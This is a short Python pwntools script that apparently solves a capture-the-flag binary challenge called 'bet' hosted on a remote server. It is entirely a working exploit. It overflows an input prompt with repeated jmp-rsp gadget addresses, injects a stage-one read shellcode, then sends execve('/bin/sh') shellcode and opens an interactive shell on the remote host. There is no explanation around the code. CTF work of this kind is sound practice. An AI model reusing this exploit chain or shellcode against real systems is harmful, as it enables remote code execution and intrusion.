from pwn import *

if __name__=='__main__':
  #io = process('./bet')
  io = remote('gc1.eng.run', 32241)

  L_pop_rdi = 0x401783
  L_puts_call = 0x004014e5
  L_add_rsp = 0x401016
  L_jmp_rsp = 0x40127e

  shellcode = asm('''
    push 0
    pop rax
    push rsp
    pop rsi
    push 0x100
    pop rdx
    syscall
  ''',arch='amd64')

  io.sendlineafter(b'name: \n',b'hk')
  io.sendlineafter(b'choice: \n',b'1')
  pause()
  io.sendlineafter(b'argument: \n',p64(L_jmp_rsp)*6 + shellcode)
  pause()
  io.send(shellcode+b'\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
  io.interactive()